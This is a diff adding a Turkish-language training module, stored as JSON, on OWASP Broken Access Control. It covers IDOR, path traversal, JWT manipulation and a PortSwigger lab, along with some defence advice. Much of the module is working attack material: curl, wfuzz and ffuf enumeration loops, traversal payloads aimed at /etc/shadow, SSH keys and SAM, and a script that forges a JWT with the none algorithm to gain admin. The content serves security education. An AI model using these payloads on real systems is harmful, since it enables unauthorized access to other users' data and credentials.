@@ -1,0 +1,158 @@
+{
+  "id": "broken-access-control",
+  "slug": "broken-access-control",
+  "title": "A01 — Broken Access Control",
+  "subtitle": "Kırık Erişim Kontrolü",
+  "description": "Kullanıcıların yetkilerinin dışında işlem yapabilmesi. IDOR, path traversal, privilege escalation, force browsing.",
+  "icon": "🔓",
+  "order": 1,
+  "tags": ["IDOR", "access control", "privilege escalation", "path traversal", "JWT", "force browsing"],
+  "modules": [
+    {
+      "id": "bac-intro",
+      "title": "Broken Access Control Nedir?",
+      "description": "Tanım, gerçek dünya örnekleri, OWASP sıralamasında neden #1",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Erişim Kontrolü Temelleri",
+          "content": "**Broken Access Control**, kullanıcıların yetki sınırlarının dışına çıkabilmesine imkân veren güvenlik açığıdır. OWASP 2021'de **#1 sıraya** taşındı — test edilen uygulamaların %94'ünde tespit edildi.\n\n**Gerçek Dünya Örnekleri:**\n- **2019 Facebook:** Kullanıcılar başkalarının özel fotoğraflarına erişebildi (IDOR)\n- **2020 Parler:** API'deki IDOR ile 70TB veri scrape edildi\n- **2021 SnapChat:** Kullanıcı adı değiştirme isteğinde IDOR — başkasının hesabını ele geçirme\n\n**Kategoriler:**\n| Zafiyet | Açıklama |\n|---------|----------|\n| **IDOR** (Insecure Direct Object Reference) | `?id=123` → `?id=124` — başkasının verisine eriş |\n| **Path Traversal** | `../../../etc/passwd` ile dosya sistemi oku |\n| **Force Browsing** | `/admin`, `/backup.zip` gibi korumasız sayfalara eriş |\n| **Privilege Escalation** | Normal kullanıcı → admin yetkisi |\n| **CORS Misconfiguration** | Yanlış CORS → başka domain'den yetkili istek |\n| **JWT Manipulation** | Token'daki rol bilgisini değiştir |\n\n**Güvenlik Prensibi — Varsayılan Reddet:**\n\"Her şeye erişim yasak. Sadece açıkça izin verilenler geçer.\"\nYerine: \"Her şeye izin var, sadece yasaklar engellenir\" → YANLIŞ"
+        }
+      ]
+    },
+    {
+      "id": "idor",
+      "title": "IDOR — Insecure Direct Object Reference",
+      "description": "En yaygın BAC türü — nesne referanslarını manipüle ederek başkasının verisine eriş",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "IDOR Nasıl Çalışır?",
+          "content": "**IDOR:** Uygulama, kullanıcının eriştiği nesnenin (dosya, kayıt, hesap) gerçekten o kullanıcıya ait olup olmadığını kontrol etmez.\n\n**Yaygın IDOR Noktaları:**\n- URL parametresi: `GET /invoice?id=1001`\n- POST body: `{\"user_id\": 42}`\n- HTTP başlığı: `X-User-ID: 42`\n- Dosya adı: `/uploads/user42_photo.jpg`\n- API: `DELETE /api/users/42`\n\n**Senaryo:**\n```\nTarayıcıda: GET /api/orders/1001 → kendi siparişin\nDeğiştir:   GET /api/orders/1002 → başkasının siparişi!\n```"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "IDOR Tespit ve Exploit",
+          "commands": [
+            {
+              "command": "# Burp Suite ile IDOR testi:\n# 1. Intercept aktif et\n# 2. /api/profile?user_id=1001 isteğini yakala\n# 3. user_id değerini değiştir: 1001 → 1002, 1, 999, admin\n# 4. Farklı kullanıcı verisi dönüyor mu kontrol et\n\n# CURL ile IDOR testi:\ncurl -b 'session=TOKEN_BURAYA' \\\n  'https://hedef.com/api/profile?user_id=1337'\n\n# user_id parametresini bruteforce et:\nfor i in {1..100}; do\n  resp=$(curl -s -b 'session=TOKEN' \"https://hedef.com/api/orders/$i\")\n  if echo \"$resp\" | grep -q 'email'; then\n    echo \"[+] ID $i: $resp\"\n  fi\ndone",
+              "description": "Temel IDOR tespiti ve bruteforce ile IDOR tarama",
+              "tip": "Burp Suite Intruder ile ID'leri otomatik enumerate etmek çok daha hızlıdır"
+            },
+            {
+              "command": "# Burp Suite Intruder ile IDOR:\n# GET /api/user/§1001§/data\n# Payload type: Numbers, 1000-2000, step 1\n# Grep match: \"email\" veya \"password\"\n# Farklı response length → geçerli ID\n\n# wfuzz ile IDOR:\nwfuzz -c -z range,1-1000 \\\n  -b 'session=TOKEN' \\\n  --hl 0 \\\n  'https://hedef.com/api/users/FUZZ/profile'",
+              "description": "Burp Intruder ve wfuzz ile sistematik IDOR tarama"
+            },
+            {
+              "command": "# IDOR — UUID/GUID formatlı ID'ler:\n# UUID predictable değil ama bazı uygulamalar ardışık timestamp kulllanıyor\n# Predictable UUID mi diye kontrol et:\npython3 -c \"\nimport uuid\n# 10 UUID üret ve sıralı mı bak:\nfor i in range(5):\n    print(uuid.uuid1())  # uuid1 timestamp tabanlı!\n# uuid4 random — tahmin edilemez\n\"",
+              "description": "UUID tabanlı IDOR — timestamp bazlı UUID'lerin tahmin edilebilirliği"
+            }
+          ]
+        },
+        {
+          "id": "defense",
+          "type": "defense",
+          "title": "IDOR Önleme",
+          "content": "**Savunma Stratejileri:**\n\n1. **Sunucu tarafında yetki kontrolü** — her istekte kontrol et:\n```python\n# Her zaman session'dan user_id al, parametreden değil:\nif order.user_id != current_user.id:\n    return 403, \"Yetkisiz erişim\"\n```\n\n2. **Dolaylı referanslar kullan:**\n```python\n# Kötü: /api/invoice/1001 (tahmin edilebilir)\n# İyi: /api/invoice/a3f8c2d1-... (random UUID)\n```\n\n3. **Her kaynak için ownership kontrolü:**\n```python\norder = Order.query.filter_by(\n    id=request.args['id'],\n    user_id=session['user_id']  # ownership kontrolü\n).first_or_404()\n```"
+        }
+      ]
+    },
+    {
+      "id": "path-traversal",
+      "title": "Path Traversal — Dosya Okuma",
+      "description": "../../../etc/passwd — dosya sistemi dışına çık",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Path Traversal Teknikleri",
+          "commands": [
+            {
+              "command": "# Temel path traversal:\n# URL: /download?file=report.pdf\n# Payload:\n/download?file=../../../etc/passwd\n/download?file=..%2F..%2F..%2Fetc%2Fpasswd   # URL encoded\n/download?file=....//....//etc/passwd         # çift dot bypass\n/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # tam encoded",
+              "description": "Path traversal payload varyasyonları"
+            },
+            {
+              "command": "# Windows path traversal:\n/download?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts\n/download?file=..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\n\n# Hedef dosyalar:\n# Linux: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, /proc/self/environ\n# Windows: C:\\Windows\\repair\\SAM, C:\\inetpub\\wwwroot\\web.config",
+              "description": "Windows path traversal ve kritik hedef dosyalar"
+            },
+            {
+              "command": "# dotdotpwn ile otomatik path traversal tarama:\ndotdotpwn -m http -h hedef.com -u '/download?file=TRAVERSAL' -b -q\n\n# ffuf ile:\nffuf -u 'https://hedef.com/download?file=FUZZ' \\\n  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n  -fs 0 -mc 200",
+              "description": "dotdotpwn ve ffuf ile path traversal fuzzing"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "jwt-manipulation",
+      "title": "JWT Privilege Escalation",
+      "description": "JWT token'ındaki rol bilgisini değiştirerek yetki yükselt",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "JWT Saldırıları",
+          "commands": [
+            {
+              "command": "# JWT decode (signature doğrulamadan):\npython3 -c \"\nimport base64, json\ntoken = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYnVyYWsiLCJyb2xlIjoidXNlciJ9.xyz'\nheader, payload, sig = token.split('.')\n# Padding ekle\npayload += '=' * (4 - len(payload) % 4)\nprint(json.loads(base64.b64decode(payload)))\n# Çıktı: {'user': 'burak', 'role': 'user'}\n\"",
+              "description": "JWT payload'ını decode et — role ve user_id gibi claim'leri gör"
+            },
+            {
+              "command": "# JWT None Algorithm saldırısı:\n# Algorithm'i 'none' yap → signature kontrolü atla\npython3 -c \"\nimport base64, json\n\n# Yeni header: alg=none\nnew_header = base64.urlsafe_b64encode(json.dumps({\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}).encode()).rstrip(b'=').decode()\n\n# Yeni payload: role=admin\nnew_payload = base64.urlsafe_b64encode(json.dumps({\\\"user\\\":\\\"burak\\\",\\\"role\\\":\\\"admin\\\"}).encode()).rstrip(b'=').decode()\n\nforged = f'{new_header}.{new_payload}.'  # boş signature!\nprint(forged)\n\"",
+              "description": "JWT None Algorithm — imzasız token ile admin yetkisi al",
+              "tip": "Sunucu 'none' algoritmasını kabul ediyorsa ciddi zafiyet — jwt_tool ile otomatik test et"
+            },
+            {
+              "command": "# jwt_tool ile kapsamlı JWT testi:\npip install jwt_tool\n\n# Tüm JWT saldırılarını test et:\njwt_tool TOKEN -M at\n\n# Weak secret brute force:\njwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt\n\n# none alg:\njwt_tool TOKEN -X a\n\n# RS256 → HS256 key confusion:\njwt_tool TOKEN -X k -pk public.pem",
+              "description": "jwt_tool ile otomatik JWT zafiyet tespiti"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "lab-bac",
+      "title": "Lab — DVWA / PortSwigger IDOR",
+      "description": "Gerçek IDOR ve BAC zafiyeti üzerinde çalış",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "IDOR Lab — PortSwigger Web Academy",
+          "scenario": {
+            "title": "IDOR ile Başka Kullanıcının Siparişine Eriş",
+            "objective": "Uygulamadaki IDOR zafiyetini kullanarak carlos kullanıcısının hesap geçmişini çal ve parolasını öğren.",
+            "environment": "PortSwigger Web Security Academy — ücretsiz lab: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references",
+            "difficulty": "beginner",
+            "steps": [
+              "Lab'ı aç, 'Live chat' özelliğini kullan",
+              "Burp Suite ile 'View transcript' isteğini yakala",
+              "URL'deki dosya adını incele: /download-transcript/2.txt",
+              "Dosya adını 1.txt olarak değiştir — carlos'un chat geçmişi",
+              "Chat geçmişinde açık metin parola ara",
+              "Bulunan parola ile carlos hesabına giriş yap"
+            ],
+            "hints": [
+              "Transcript dosyaları sıralı numaralandırılmış",
+              "carlos kullanıcısı genellikle ID 1",
+              "Burp Repeater ile istek tekrar et"
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
